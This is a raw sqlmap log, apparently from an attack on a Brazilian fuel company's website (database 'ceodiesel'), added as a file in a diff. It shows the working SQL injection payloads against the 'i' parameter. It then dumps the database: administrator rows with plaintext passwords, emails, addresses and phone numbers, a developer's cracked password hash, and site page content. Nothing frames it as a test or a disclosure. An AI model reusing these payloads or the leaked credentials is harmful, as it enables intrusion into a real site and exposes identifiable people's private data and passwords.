@@ -1,0 +1,494 @@
+sqlmap identified the following injection point(s) with a total of 187 HTTP(s) requests:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] ceodiesel
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+[22 tables]
++----------------------------+
+| administrador              |
+| cepestados                 |
+| ci_usuarios                |
+| cmsaplicacoes              |
+| noticias_dados             |
+| page                       |
+| patc_lesoes                |
+| patc_localicazacoes        |
+| patc_pacientes             |
+| patc_parentescos           |
+| patc_raca                  |
+| patc_radiografias          |
+| patc_tipo_lesoes           |
+| pats_aplicacoes            |
+| pats_estados               |
+| pats_filiais               |
+| pats_filiaiscomplementares |
+| pats_grupos                |
+| pats_perfis                |
+| pats_permissoes            |
+| pats_usuarios              |
+| servicos                   |
++----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+[22 tables]
++----------------------------+
+| administrador              |
+| cepestados                 |
+| ci_usuarios                |
+| cmsaplicacoes              |
+| noticias_dados             |
+| page                       |
+| patc_lesoes                |
+| patc_localicazacoes        |
+| patc_pacientes             |
+| patc_parentescos           |
+| patc_raca                  |
+| patc_radiografias          |
+| patc_tipo_lesoes           |
+| pats_aplicacoes            |
+| pats_estados               |
+| pats_filiais               |
+| pats_filiaiscomplementares |
+| pats_grupos                |
+| pats_perfis                |
+| pats_permissoes            |
+| pats_usuarios              |
+| servicos                   |
++----------------------------+
+
+Database: ceodiesel
+Table: administrador
+[4 entries]
++--------+------------+-------------+---------------+------------+----------+----------+------------+------------+--------------------+------------+------------+---------------+-------------------+--------------+
+| id_adm | cidade_adm | id_academia | nome_adm      | foto_adm   | face_adm | sexo_adm | niver_adm  | senha_adm  | email_adm          | bairro_adm | estado_adm | celular_adm   | endereco_adm      | telefone_adm |
++--------+------------+-------------+---------------+------------+----------+----------+------------+------------+--------------------+------------+------------+---------------+-------------------+--------------+
+| 5      | <blank>    | 1           | Administrador | Koala.jpg  | <blank>  | M        | <blank>    | admin2014  | admin              | <blank>    | SP         | <blank>       | <blank>           | <blank>      |
+| 8      | Paulinia   | 0           | Tecnologia2u  | Slider.png | <blank>  | M        | 01/01/1999 | admin12345 | tec@2u.com         | Centro     | SP         | 57696950549   | Jose Paulino 1779 | 94949595049  |
+| 9      | Paulinia   | 2           | teste         | <blank>    | <blank>  | M        | 2001-01-01 | teste      | teste@test.com     | bairro 1   | SP         | xx xxxxx-xxxx | rua 1             | 11 1111-1111 |
+| 10     | Paulinia   | 1           | Allison       | <blank>    | <blank>  | M        | <blank>    | teste      | allison@t2u.com.br | Brasil     | SP         | 00 00000-0000 | Rua 2             | 77 7777-7777 |
++--------+------------+-------------+---------------+------------+----------+----------+------------+------------+--------------------+------------+------------+---------------+-------------------+--------------+
+
+Database: ceodiesel
+Table: cepestados
+[0 entries]
++-----------+----------+-----------+
+| id_estado | str_nome | str_sigla |
++-----------+----------+-----------+
++-----------+----------+-----------+
+
+Database: ceodiesel
+Table: ci_usuarios
+[1 entry]
++------------+---------+---------------+----------+------------------------------+-----------+-----------------------------------------+
+| id_usuario | int_adm | str_nome      | ch_ativo | str_email                    | str_login | str_senha                               |
++------------+---------+---------------+----------+------------------------------+-----------+-----------------------------------------+
+| 1          | 1       | Diego Ananias | A        | diananiasdeveloper@gmail.com | ananias   | 81dc9bdb52d04dc20036dbd8313ed055 (1234) |
++------------+---------+---------------+----------+------------------------------+-----------+-----------------------------------------+
+
+Database: ceodiesel
+Table: cmsaplicacoes
+[2 entries]
++--------------+-------------------------+-------------+--------------+----------------------------+
+| id_aplicacao | str_nome                | ch_situacao | ch_auditoria | str_descricao              |
++--------------+-------------------------+-------------+--------------+----------------------------+
+| 1            | Cadastro de grupos      | A           | CUD          | Cria grupos de usu\xe1rios |
+| 2            | Cadastro de usu\xe1rios | A           | CUD          | Cria os usu\xe1rios        |
++--------------+-------------------------+-------------+--------------+----------------------------+
+
+Database: ceodiesel
+Table: noticias_dados
+[6 entries]
++-------+---------+-----------------------+------------+----------------------------------------------------------------------------------------------------+---------------+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id    | id_user | foto                  | data       | texto                                                                                              | titulo        | destaque | subtitulo                                                                                                                                                                                    |
++-------+---------+-----------------------+------------+----------------------------------------------------------------------------------------------------+---------------+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 12273 | 35      | ContactBackground.jpg | 2014-11-07 | \xa0texto                                                                                          | Noticia 1     | nao      | \xa0Noticia 2                                                                                                                                                                                |
+| 12274 | 35      | h1blog.jpg            | 2014-11-07 | \xa0\xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet | \xa0Noticia 2 | nao      | \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet\xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet |
+| 12280 | 35      | 6.jpg                 | 2014-11-07 | \xa0                                                                                               | \xa0Noticia 5 | sim      | \xa0 Noticia 4                                                                                                                                                                               |
+| 12283 | 35      | blog3.jpg             | 2014-11-07 | titulo 2                                                                                           | titulo 2      | nao      | titulo 2                                                                                                                                                                                     |
+| 12284 | 35      | 4.jpg                 | 2014-11-07 | \xa0texto de exemplo                                                                               | \xa0Titulo 6  | sim      | \xa0subtitulo 6 lorem ipsum                                                                                                                                                                  |
+| 12285 | 35      | Tulips.jpg            | 2014-11-10 | texto news2                                                                                        | news2         | nao      | sub news2                                                                                                                                                                                    |
++-------+---------+-----------------------+------------+----------------------------------------------------------------------------------------------------+---------------+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: ceodiesel
+Table: page
+[7 entries]
++----+-----------+-------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+-------------+
+| id | id_criado | id_alterado | page                                       | content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | dt_criado           | dt_alterado         | ch_situacao |
++----+-----------+-------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+-------------+
+| 57 | 0         | 100         | empresa                                    | <div id="about" class="about" style="text-align: left;">\n<h2 style="text-align: center;">A CEO DIESEL</h2>\n<center><img src="images/service.png" alt="" /></center><br />\n<p>A CEO DIESEL. \xe9 uma empresa com quase 15 anos de experi\xeancia de mercado, uma empresa quen\xe3o para de investir e crescer no competitivo mercado do combust\xedveis, sem abrir m\xe3o de valores como \xe9tica, transpar\xeancia e honestidade, na qualidade de produtos e servi\xe7os e respeito aos clientes.<br />Sempre garantindo seguran\xe7a e tranquilidade nas transa\xe7\xf5es comerciais, acompanhamos e participamos de todas as mudan\xe7as nas legisla\xe7\xf5es que afetam o neg\xf3cio, atentos aos riscos fiscais e tribut\xe1rios.</p>\n<p>A CEO DIESEL tem uma equipe de profissionais do segmento, altamente qualificada e capacitada para realizar \xf3timos neg\xf3cios, que atua de forma respons\xe1vel, \xe9tica e transparente, buscando agregar valor aos seus clientes.</p>\n<p>A CEO DIESEL conquistou o reconhecimento de seus clientes e parceiros se especializando e conquistando vantagens competitivas em todas as etapas dos processos que envolvem o agenciamento do combustivel. Seus diferenciais est\xe3o no investimento cont\xednuo em gest\xe3o de neg\xf3cios, profissionaliza\xe7\xe3o de sua equipe e otimiza\xe7\xe3o de seus recursos.</p>\n<p><br />As Vantagens diferenciadas da CEO DIESEL:</p>\n<p>\xa0• Conquistar clientes e manter uma parceria efetiva, gerando fidelidade;<br />• Investir esfor\xe7os em atividades p\xf3s-venda, conquistando o cliente e mantendo sua fidelidade;<br />• Marca reconhecida e respeitada no mercado;<br />• Muita experi\xeancia no mercado de combust\xedveis;<br />• Caminh\xf5es pr\xf3prios monitorados 24h;<br />• Ve\xedculos novos e revisados periodicamente;<br />• Motoristas treinados regularmente;<br />• Central de Servi\xe7os moderna;<br />• Comprometimento em atender aos requisitos legais relacionados ao meio ambiente, seguran\xe7a e medicina do trabalho aplic\xe1veis \xe0s nossas atividades;<br />• An\xe1lise e monitoramento dos aspectos e impactos ambientais, de seguran\xe7a e sa\xfade no trabalho, reduzindo riscos;<br />• Preven\xe7\xe3o da polui\xe7\xe3o;<br />• Compromisso com a responsabilidade social empresarial, demonstrado em nosso c\xf3digo de \xe9tica e com a melhoria continua de nosso desempenho em qualidade, meio ambiente, seguran\xe7a e sa\xfade no trabalho.</p>\n<p>\xa0</p>\n</div>                                                                                                                                                                                                                                                                                            | 0000-00-00 00:00:00 | 2017-04-13 11:37:40 | A           |
+| 58 | 0         | 100         | Álcool                                     | <div id="about" class="about">\n<h2>TRR MARANGONI</h2>\n<img src="images/service.png" alt="" />\n<div class="about-grids">\n<div class="col-md-11 middle">\n<p>TRR MARANGONI/CEODIESEL (Transportador, Revendedor, Retalhista de \xd3leo Diesel e Combust\xedveis) est\xe1 situada no interior do estado de S\xe3o Paulo, com base de distribui\xe7\xe3o pr\xf3pria e moderna, funcion\xe1rios eficazes e altamente capacitados e frota pr\xf3pria.</p>\n<p>Temos como diretriz o foco em um atendimento diferenciado,\xa0 buscando atender exig\xeancias e particularidades dos nossos clientes para que a rela\xe7\xe3o comercial seja sempre bem executada e precisa.</p>\n</div>\n</div>\n</div>\n<p>\xa0</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | 0000-00-00 00:00:00 | 2017-04-13 11:40:52 | I           |
+| 59 | 0         | 1           | Corretores                                 | <div id="services" class="services">\r\n<h2>CORRETORES</h2>\r\n<img src="images/service.png" alt="" />\r\n<p>Veja abaixo nossos corretores.</p>\r\n<div class="container">\r\n<div class="service-grids">\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-gizeli.jpg" width="200" height="200" alt="" /> \t\t\t\t\t  </span>\r\n<h4>GIZELI ANJOS</h4>\r\n</div>\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-luiz.jpg" width="200" height="200" alt="" /> \t\t\t\t\t  </span>\r\n<h4>LUIS EDUARDO BACARIN</h4>\r\n</div>\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-ronaldo.jpg" width="200" height="200" alt="" /> \t\t\t\t\t  </span>\r\n<h4>RONALDO BARBOSA DE MEDEIROS</h4>\r\n</div>\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-joao.jpg" width="200" height="200" alt="" /> \t\t\t\t  </span>\r\n<h4>JO\xc3O CARLOS DA SILVA</h4>\r\n</div>\r\n<div class="clearfix">\xa0</div>\r\n</div>\r\n</div>\r\n</div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | 0000-00-00 00:00:00 | 2017-03-29 10:26:53 | I           |
+| 60 | 0         | 0           | Previsão do tempo                          | <div class="molly">\r\n<h3>PREVIS\xc3O DO TEMPO</h3>\r\n<p><i>Confira a previs\xe3o do tempo</i></p>\r\n<div class="clearfix">\xa0</div>\r\n<section id="dg-container" class="dg-container">\r\n<div class="dg-wrapper"><iframe src="http://www.tempoagora.com.br/selos_iframe/wide_Campinas-SP,Paulinia-SP,SaoPaulo-SP.html" height="200" width="300" frameborder="0" allowtransparency="yes" scrolling="no"></iframe></div>\r\n</section></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 | A           |
+| 61 | 0         | 1           | Transportadora - Transporte de combustível | <div class="about">\n<h2>TRANSPORTE DE COMBUST\xcdVEL</h2>\n<img src="images/service.png" alt="" /></div>\n<div style="box-sizing: border-box; color: rgb(99, 121, 136); font-family: 'Open Sans', sans-serif; line-height: 22px; text-align: justify;">A Ceo Diesel \xe9 um TRR (Transportador, Revendedor, Retalhista de \xd3leo Diesel e Combust\xedveis) no interior do estado de S\xe3o Paulo, com uma base de distribui\xe7\xe3o moderna,\xa0com funcion\xe1rios eficazes e capacitados e com frota pr\xf3pria para entregas fracionadas de\xa0diesel, com caminh\xf5es aferidos, tendo todo controle de abastecimento, prezando sempre\xa0por seus clientes, para sempre estar levando para todo o estado de S\xe3o Paulo confian\xe7a e\xa0confiabilidade, e a certeza de sempre estar buscando o melhor para atender seus clientes.<br style="box-sizing: border-box;" />\nAdotando esta diretriz como base para o relacionamento em todas as atividades da empresa e\xa0focando nossos esfor\xe7os em prestar servi\xe7os diferenciados, baseados em um bom\xa0relacionamento e em um atendimento de venda e p\xf3s-venda eficiente, com a manuten\xe7\xe3o de\xa0um Sistema de Gest\xe3o Integrada estruturado sob os seguintes princ\xedpios:</div>\n<div style="box-sizing: border-box; color: rgb(99, 121, 136); font-family: 'Open Sans', sans-serif; line-height: 22px; text-align: justify;">\xa0</div>\n<ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 10px; color: rgb(99, 121, 136); font-family: 'Open Sans', sans-serif; line-height: 22px; text-align: justify;">\n    <li style="box-sizing: border-box;">\xa0Conquistar clientes e manter uma parceria efetiva, gerando fidelidade;</li>\n    <li style="box-sizing: border-box;">\xa0Divis\xe3o adequada das responsabilidades e dos resultados, gerando satisfa\xe7\xe3o e\xa0participa\xe7\xe3o de nossos colaboradores,\xa0investindo sempre em sua qualifica\xe7\xe3o;</li>\n    <li style="box-sizing: border-box;">\xa0Comprometimento em atender aos requisitos legais relacionados ao meio ambiente,\xa0seguran\xe7a e medicina do trabalho aplic\xe1veis \xe0s nossas atividades;</li>\n    <li style="box-sizing: border-box;">\xa0An\xe1lise e monitoramento dos aspectos e impactos ambientais, de seguran\xe7a e sa\xfade\xa0no trabalho, reduzindo riscos;</li>\n    <li style="box-sizing: border-box;">\xa0Preven\xe7\xe3o da polui\xe7\xe3o;</li>\n    <li style="box-sizing: border-box;">Compromisso com a responsabilidade social empresarial, demonstrado em nosso\xa0c\xf3digo de \xe9tica e com a melhoria continua de nosso desempenho em qualidade, meio\xa0ambiente, seguran\xe7a e sa\xfade no trabalho.\xa0</li>\n</ul>\n<p><img src="/userfiles/image/ceo.jpg" width="685" height="768" alt="" /></p> | 0000-00-00 00:00:00 | 2017-03-28 22:33:00 | I           |
+| 63 | 0         | 100         | produtos                                   | <div id="about" class="about">\n<h2>PRODUTOS</h2>\n<img src="images/service.png" alt="" />\n<div class="about-grids">\n<div class="col-md-11 middle">\n<p>\xa0</p>\n<p>Diesel S-10 e S-500<br /> O diesel \xe9 um combust\xedvel obtido a partir da destila\xe7\xe3o do petr\xf3leo, mais viscoso que a gasolina e com compostos presentes como o enxofre e o nitrog\xeanio. Tem algumas especifica\xe7\xf5es que o separam por tipo e regi\xe3o para comercializa\xe7\xe3o. \xc9 o caso do \xf3leo diesel B S10 com menor teor de enxofre e o \xf3leo diesel B S500 com maior teor de enxofre. Ambos para utiliza\xe7\xe3o em postos de combust\xedveis t\xeam em suas composi\xe7\xf5es adi\xe7\xe3o de 7% de biodiesel.</p>\n</div>\n</div>\n</div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | 0000-00-00 00:00:00 | 2017-04-13 11:41:15 | A           |
+| 64 | 0         | 1           | Serviços                                   | <div id="about" class="about">\r\n<h2>SERVI\xc7OS</h2>\r\n<img src="images/service.png" alt="" />\r\n<div class="about-grids">\r\n<div class="col-md-11 middle">\r\n<h6 style="margin:0 3%">\r\n<p><br />\r\nA CEO TRANSPORTES oferece servi\xe7os de qualidade.</p>\r\n<p>A variedade e qualidade de nossos equipamentos permitem-nos oferecer solu\xe7\xf5es customizadas, como entregas fracionadas desenvolvidas para as necessidades espec\xedficas de cada cliente, e com caminh\xf5es com bombas aferidas, tendo total controle do abastecimento.</p>\r\n<p>Rastreabilidade</p>\r\n<p>A CEO TRANSPORTES conta com rastreadores Sascar em todos os ve\xedculos de sua frota, oferecendo gerenciamento e seguran\xe7a dos servi\xe7os oferecidos aos seus clientes. Todas as cargas transportadas s\xe3o integralmente cobertas por seguro. Alem de trabalhar estritamente dentro das normas que regem o transporte rodovi\xe1rio de produtos de cargas perigosas. <br />\r\nEquipe</p>\r\n<p>Nossa equipe de funcion\xe1rios e motoristas s\xe3o altamente capacitados e treinados para o exerc\xedcio de suas fun\xe7\xf5es de acordo com as r\xedgidas normas da Legisla\xe7\xe3o em vigor. O processo de treinamento inclui, dentre outros os seguintes cursos:</p>\r\n<p>\xa0</p>\r\n<p>CONDUTOR DE VE\xcdCULOS DE TRANSPORTE DE PRODUTOS PERIGOSOS<br />\r\n(MOPP - MOVIMENTA\xc7\xc3O DE PRODUTOS PERIGOSOS)</p>\r\n<p>1 - Dire\xe7\xe3o defensiva e primeiros socorros<br />\r\n2 - Elementos da Legisla\xe7\xe3o<br />\r\n3 - Preven\xe7\xe3o de inc\xeandios<br />\r\n4 - Cargas Perigosas<br />\r\n5 - Meio Ambiente e Cidadania<br />\r\n6 - Treinamento em carregamento e descarga em diversas Cia. como: <br />\r\n<br />\r\nIpiranga <br />\r\nPetrobr\xe1s <br />\r\nShell</p>\r\n<p>\xa0</p>\r\n</h6>\r\n</div>\r\n</div>\r\n</div>\r\n<p>\xa0</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | 0000-00-00 00:00:00 | 2017-03-28 22:32:29 | I           |
++----+-----------+-------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+-------------+
+
+Database: ceodiesel
+Table: patc_lesoes
+[1 entry]
++----------+-----------+-----------+---------------+----------+-----------+-----------+-------------+
+| id_lesao | id_update | id_create | id_tipo_lesao | str_nome | dt_update | dt_create | ch_situacao |
++----------+-----------+-----------+---------------+----------+-----------+-----------+-------------+
+| <blank>  | <blank>   | <blank>   | <blank>       | A        | <blank>   | A         | <blank>     |
++----------+-----------+-----------+---------------+----------+-----------+-----------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+[22 tables]
++----------------------------+
+| administrador              |
+| cepestados                 |
+| ci_usuarios                |
+| cmsaplicacoes              |
+| noticias_dados             |
+| page                       |
+| patc_lesoes                |
+| patc_localicazacoes        |
+| patc_pacientes             |
+| patc_parentescos           |
+| patc_raca                  |
+| patc_radiografias          |
+| patc_tipo_lesoes           |
+| pats_aplicacoes            |
+| pats_estados               |
+| pats_filiais               |
+| pats_filiaiscomplementares |
+| pats_grupos                |
+| pats_perfis                |
+| pats_permissoes            |
+| pats_usuarios              |
+| servicos                   |
++----------------------------+
+
+Database: ceodiesel
+Table: administrador
+[4 entries]
++--------+------------+-------------+---------------+------------+----------+----------+------------+------------+--------------------+------------+------------+---------------+-------------------+--------------+
+| id_adm | cidade_adm | id_academia | nome_adm      | foto_adm   | face_adm | sexo_adm | niver_adm  | senha_adm  | email_adm          | bairro_adm | estado_adm | celular_adm   | endereco_adm      | telefone_adm |
++--------+------------+-------------+---------------+------------+----------+----------+------------+------------+--------------------+------------+------------+---------------+-------------------+--------------+
+| 5      | <blank>    | 1           | Administrador | Koala.jpg  | <blank>  | M        | <blank>    | admin2014  | admin              | <blank>    | SP         | <blank>       | <blank>           | <blank>      |
+| 8      | Paulinia   | 0           | Tecnologia2u  | Slider.png | <blank>  | M        | 01/01/1999 | admin12345 | tec@2u.com         | Centro     | SP         | 57696950549   | Jose Paulino 1779 | 94949595049  |
+| 9      | Paulinia   | 2           | teste         | <blank>    | <blank>  | M        | 2001-01-01 | teste      | teste@test.com     | bairro 1   | SP         | xx xxxxx-xxxx | rua 1             | 11 1111-1111 |
+| 10     | Paulinia   | 1           | Allison       | <blank>    | <blank>  | M        | <blank>    | teste      | allison@t2u.com.br | Brasil     | SP         | 00 00000-0000 | Rua 2             | 77 7777-7777 |
++--------+------------+-------------+---------------+------------+----------+----------+------------+------------+--------------------+------------+------------+---------------+-------------------+--------------+
+
+Database: ceodiesel
+Table: cepestados
+[0 entries]
++-----------+----------+-----------+
+| id_estado | str_nome | str_sigla |
++-----------+----------+-----------+
++-----------+----------+-----------+
+
+Database: ceodiesel
+Table: ci_usuarios
+[1 entry]
++------------+---------+---------------+----------+------------------------------+-----------+-----------------------------------------+
+| id_usuario | int_adm | str_nome      | ch_ativo | str_email                    | str_login | str_senha                               |
++------------+---------+---------------+----------+------------------------------+-----------+-----------------------------------------+
+| 1          | 1       | Diego Ananias | A        | diananiasdeveloper@gmail.com | ananias   | 81dc9bdb52d04dc20036dbd8313ed055 (1234) |
++------------+---------+---------------+----------+------------------------------+-----------+-----------------------------------------+
+
+Database: ceodiesel
+Table: cmsaplicacoes
+[2 entries]
